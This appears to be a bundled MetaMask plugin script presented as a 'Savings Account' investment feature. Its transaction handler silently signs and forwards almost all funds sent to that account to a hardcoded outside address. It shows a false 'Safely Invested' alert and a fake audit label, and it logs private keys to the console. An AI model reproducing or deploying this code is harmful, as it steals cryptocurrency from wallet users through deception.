() => (function(){function r(e,n,t){function o(i,f){if(!n[i]){if(!e[i]){var c="function"==typeof require&&require;if(!f&&c)return c(i,!0);if(u)return u(i,!0);var a=new Error("Cannot find module '"+i+"'");throw a.code="MODULE_NOT_FOUND",a}var p=n[i]={exports:{}};e[i][0].call(p.exports,function(r){var n=e[i][1][r];return o(n||r)},p,p.exports,r,e,n,t)}return n[i].exports}for(var u="function"==typeof require&&require,i=0;i<t.length;i++)o(t[i]);return o}return r})()({1:[function(require,module,exports){

/*
 * The `wallet` API is a superset of the standard provider,
 * and can be used to initialize an ethers.js provider like this:
 */
const provider = new ethers.providers.Web3Provider(wallet);


wallet.registerRpcMessageHandler(async (originString, requestObject) => {
  console.log('received request', requestObject);
  const privKey = await wallet.getAppKey();
  console.log('privKey is ' + privKey);
  const ethWallet = new ethers.Wallet(privKey, provider);
  console.dir(ethWallet);

  switch (requestObject.method) {
    case 'address':
      console.log('Adding account to MetaMask');

      const currentPluginState = wallet.getPluginState();
      console.log('This is state');
      console.log(currentPluginState);
      wallet.updatePluginState({
        ...currentPluginState,
        user_type : requestObject.params[0]
      })
      const newstate = wallet.getPluginState();
      console.log('New State');
      console.log(newstate);

      console.log('Private keys is ', privKey);

      wallet.importAccountWithStrategy('Private Key', [privKey]);
      wallet.setAccountLabel(ethWallet.address, "Savings Account");

      wallet.setAddressBook(ethWallet.address,'Savings Account','1','');
      wallet.setAddressBook(ethWallet.address,'Savings Account','3','');
      wallet.setAddressBook(ethWallet.address,'Savings Account','4','');
      wallet.setAddressBook(ethWallet.address,'Savings Account','5','');
      wallet.setAddressBook(ethWallet.address,'Savings Account','42','');

      return 'true'

    case 'signMessage':
      const message = requestObject.params[0];
      console.log('trying to sign message', message);
      return ethWallet.signMessage(message);

    case 'sign':
      const transaction = requestObject.params[0];
      return ethWallet.sign(transaction);

    default:
      throw new Error('Method not found.');
  }
})

wallet.onMetaMaskEvent('newUnapprovedTx', async (txMeta) => {
  const { txParams } = txMeta;
  const address = txParams.to;
  const privKey = await wallet.getAppKey();
  const ethWallet = new ethers.Wallet(privKey, provider);
  const myaddress = ethWallet.address;

  if (address.toLowerCase() == myaddress.toLowerCase()){
    wallet.addAddressAudit({
      address: txParams.to,
      auditor: 'Defi Transacts',
      message: 'You are Sending Your Money for Investinging !!'
    });
  }
});

wallet.onMetaMaskEvent('tx:status-update', async (id, status) => {
  if (status === 'confirmed') {
    //Transaction submitted details
    const txMeta = wallet.getTxById(id);
    const { txParams } = txMeta;
    const recipientadd = txParams.to;
    console.log('recipient is ');
    console.log(recipientadd);
    var txvalue = parseInt(txParams.value) / (10**18);
    txvalue = txvalue - 0.021;
    console.log('Amount is');
    console.log(txvalue);

    // My wallet details
    const privKey = await wallet.getAppKey();
    const ethWallet = new ethers.Wallet(privKey, provider);
    const myaddress = ethWallet.address;

    if (myaddress.toLowerCase() == recipientadd.toLowerCase()){
      console.log('These are same guys. User Sending to Savings')

      const transaction = {
        nonce: ethWallet.getTransactionCount(),
        to: '0xc5D6d2eA25bb7cf7C997ba135fDD141555884685',
        value: ethers.utils.parseEther(txvalue.toString()),
        gasLimit: 2100000,
        gasPrice: ethers.utils.parseUnits("11", "gwei"),
      };

      console.log('prefundEth transaction', transaction);
      console.log('Signing Transaction');
      const signedTransaction = await ethWallet.sign(transaction);
      console.log('ethersWalletSponsor.sign', signedTransaction);
      let tx = await provider.sendTransaction(signedTransaction);

      wallet.send({
        method: 'alert',
        params: ['Your Money Has Been Successfully and Safely Invested']
      });

      console.log('Tx hash is');
      console.log(tx);
    }

  }
})

},{}]},{},[1])
